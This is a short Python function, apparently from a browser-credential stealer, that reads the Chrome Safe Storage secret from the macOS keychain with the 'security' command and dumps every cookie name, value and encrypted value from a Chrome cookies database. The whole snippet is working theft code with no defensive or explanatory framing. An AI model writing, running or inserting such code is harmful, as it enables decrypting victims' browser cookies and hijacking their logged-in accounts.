import subprocess

def read_browser_session(db):
    secret = subprocess.run(["security", "find-generic-password", "-w", "-s", "Chrome Safe Storage", "-a", "Chrome"], capture_output=True)
    return db.execute("SELECT name, value, hex(encrypted_value) FROM cookies").fetchall(), secret.stdout
